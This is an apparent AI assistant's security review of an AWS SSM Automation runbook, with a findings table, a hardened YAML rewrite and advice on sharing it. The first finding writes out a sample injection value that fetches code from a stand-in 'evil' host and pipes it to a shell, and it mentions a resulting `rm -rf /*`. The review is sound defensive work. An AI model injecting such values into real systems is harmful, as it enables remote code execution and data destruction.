{"id": "da4eade6-9437-4f72-8663-38f94476afda", "role": "assistant", "content": [{"text": "# Security review: Automation runbook

I didn't run anything against your account. This is a static review, and I'd test the hardened version in a non-prod account before you share it.

## Findings

| # | Severity | Issue | Why it matters |
|---|---|---|---|
| 1 | Critical | `LogPath` has `allowedPattern: '.*'` and is interpolated unquoted into `tar` and `rm -rf` | This allows shell injection (`/x; curl evil\|sh`). An empty or `/` value turns the command into `rm -rf /*`. `..` traversal also works. |
| 2 | Critical | `echo "restarting with password {{DbPassword}}"` | SSM interpolates the value into the command text. The password then lands in command history, the Run Command output, CloudWatch Logs or S3 output, and the instance's process list. `SecureString` is also not a supported parameter type in Automation documents, so the document will likely fail validation. |
| 3 | High | `curl -k` | It disables TLS verification, so an attacker on the path can spoof the endpoint. There's no timeout and no `--fail`. |
| 4 | High | Hardcoded `assumeRole: [redacted ARN]` | Every team that uses the shared document runs with your role. It also won't work cross-account. The role's permissions aren't visible to reviewers. |
| 5 | High | `onFailure: Continue` on the destructive step | If the archive or delete fails, the runbook carries on and reports success. |
| 6 | Medium | `InstanceId` has no type or pattern | Any string is accepted. Use the `AWS::EC2::Instance::Id` type. |
| 7 | Medium | The backup tarball goes to `/var/tmp` with default permissions | Logs often contain secrets or PII, and `/var/tmp` is world-traversable and survives reboots. |
| 8 | Medium | `describe_instance_status()` is unscoped | It queries every instance in the account and needs broad `ec2:Describe*` access. The result isn't tied to `InstanceId`, so the check proves nothing. It also needs an `executeScript` step, which is a larger attack surface than a native API check. |
| 9 | Low | `timeoutSeconds: 1200` on `executeScript` | `aws:executeScript` caps at 600s, so this value is likely invalid. `onCancel: step:Wait` is pointless here. |
| 10 | Low | The description says "restarts the app service", but nothing restarts it | The health check runs before the sleep, so the order is also wrong. |
| 11 | Low | No command timeout or output logging | A hung command ties up the step, and there's no audit trail. |

## Hardened version

```yaml
schemaVersion: '0.3'
description: >-
  Rotates an application log directory and restarts its systemd service on a
  single EC2 instance, then verifies instance status. Caller supplies their own
  least-privilege automation role. No secrets are accepted or logged.
assumeRole: '{{AutomationAssumeRole}}'
parameters:
  AutomationAssumeRole:
    type: String
    description: (Required) Role Automation assumes. Must be scoped to the target instance(s).
    allowedPattern: '^arn:aws(-[a-z]+)*:iam::[0-9]{12}:role/[\w+=,.@/-]{1,128}$'
  InstanceId:
    type: AWS::EC2::Instance::Id
    description: (Required) Target instance.
  LogPath:
    type: String
    description: Absolute directory under /var/log, e.g. /var/log/myapp
    # Must be /var/log/<segment>[/<segment>...]; segments can't start with '.', so no '..'
    allowedPattern: '^/var/log/[A-Za-z0-9_-][A-Za-z0-9._-]{0,63}(/[A-Za-z0-9_-][A-Za-z0-9._-]{0,63}){0,3}$'
  ServiceName:
    type: String
    description: systemd unit to restart, e.g. myapp
    allowedPattern: '^[A-Za-z][A-Za-z0-9_.@-]{0,63}$'
  NotifyUrl:
    type: String
    description: (Optional) HTTPS endpoint to notify on success.
    default: ''
    allowedPattern: '^$|^https://[A-Za-z0-9.-]+(:[0-9]{1,5})?(/[A-Za-z0-9._~/%-]*)?$'
mainSteps:
  - name: RotateLogsAndRestart
    action: aws:runCommand
    onFailure: Abort
    timeoutSeconds: 600
    inputs:
      DocumentName: AWS-RunShellScript
      InstanceIds:
        - '{{InstanceId}}'
      CloudWatchOutputConfig:
        CloudWatchOutputEnabled: true
      Parameters:
        executionTimeout: ['300']
        commands:
          - |
            set -euo pipefail
            umask 077
            LOG_DIR='{{LogPath}}'
            SERVICE='{{ServiceName}}'
            NOTIFY_URL='{{NotifyUrl}}'
            BACKUP_DIR=/var/backups/app-log-rotation

            # Defense in depth: resolve symlinks and re-check the prefix
            REAL="$(realpath -e -- "$LOG_DIR")"
            case "$REAL" in /var/log/?*) ;; *) echo "Refusing path: $REAL" >&2; exit 1;; esac
            [ -d "$REAL" ] || { echo "Not a directory" >&2; exit 1; }

            install -d -m 700 "$BACKUP_DIR"
            ARCHIVE="$BACKUP_DIR/$(basename "$REAL")-$(date -u +%Y%m%dT%H%M%SZ).tgz"
            tar -czf "$ARCHIVE" -C "$(dirname "$REAL")" -- "$(basename "$REAL")"
            tar -tzf "$ARCHIVE" >/dev/null   # verify archive before deleting anything

            # Delete only regular log files in this directory (no recursion, no symlink following)
            find "$REAL" -mindepth 1 -maxdepth 1 -type f \( -name '*.log' -o -name '*.log.*' \) -delete

            systemctl restart -- "$SERVICE"
            systemctl is-active --quiet -- "$SERVICE"

            if [ -n "$NOTIFY_URL" ]; then
              curl --fail --silent --show-error --proto '=https' --tlsv1.2 \
                   --max-time 10 --retry 2 -X POST -- "$NOTIFY_URL" \
                || echo "WARN: notification failed" >&2
            fi
  - name: WaitForSettle
    action: aws:sleep
    inputs:
      Duration: PT30S
  - name: CheckHealth
    action: aws:waitForAwsResourceProperty
    timeoutSeconds: 300
    onFailure: Abort
    inputs:
      Service: ec2
      Api: DescribeInstanceStatus
      InstanceIds:
        - '{{InstanceId}}'
      PropertySelector: '$.InstanceStatuses[0].InstanceStatus.Status'
      DesiredValues:
        - ok
```

## What changed

- **Injection:** `LogPath` is pinned to `/var/log/...` with no `..`, and `ServiceName` is allow-listed. The script also re-checks the path with `realpath`, so symlinks can't escape. It quotes every variable and uses `set -euo pipefail`.
- **Deletion:** `rm -rf path/*` became a non-recursive `find ... -delete` limited to `*.log` and `*.log.*` files. The archive is verified before anything is deleted.
- **Secrets:** The `DbPassword` parameter and the echo are gone. If the app needs the password, have it read the value from Secrets Manager or Parameter Store on the instance, using the instance profile.
- **TLS:** `-k` is removed. The call now enforces HTTPS and TLS 1.2, with a timeout and `--fail`. The URL is an optional, pattern-checked parameter instead of a hardcoded one.
- **Role:** The role is now a required parameter with no default, so each team uses its own.
- **Failure handling:** Failures abort instead of continuing.
- **Health check:** It now targets only `InstanceId`, uses a native API check instead of an inline Python script, and runs after the restart.
- **Backup location:** The backup moved to a `0700` directory under `/var/backups`.
- **Logging:** Command output goes to CloudWatch Logs, and the command has a timeout.

## Before you share it

1. **Scope each team's role to least privilege.** The role needs `ssm:SendCommand` on the `AWS-RunShellScript` document and on only that team's instances (for example, with a tag condition). It also needs `ssm:GetCommandInvocation`, `ssm:ListCommandInvocations`, `ssm:DescribeInstanceInformation`, and `ec2:DescribeInstanceStatus`. If you enable CloudWatch output, it needs access to that log group too. Users starting the runbook need `iam:PassRole` for only that role.
2. **Share with named account IDs only.** Use `ssm modify-document-permission` with specific accounts, never `all`. Version the document and share a pinned version.
3. **Check the instance profile.** The instances need SSM Agent and a profile that can write to your CloudWatch log group. Encrypt that log group with KMS, because log output can still contain sensitive data.
4. **Validate the document.** Run `aws ssm create-document` with `--document-type Automation` in a sandbox, then run a test against a throwaway instance. I haven't run it. The parts to watch are the `allowedPattern` regexes and `waitForAwsResourceProperty` against your instance types.
5. **Add alerting.** An EventBridge rule on Automation execution failures gives you visibility.

I can also draft the least-privilege IAM policy for the automation role, or a version that targets instances by tag instead of ID. Say which you want.", "type": "text"}], "created_at": null}
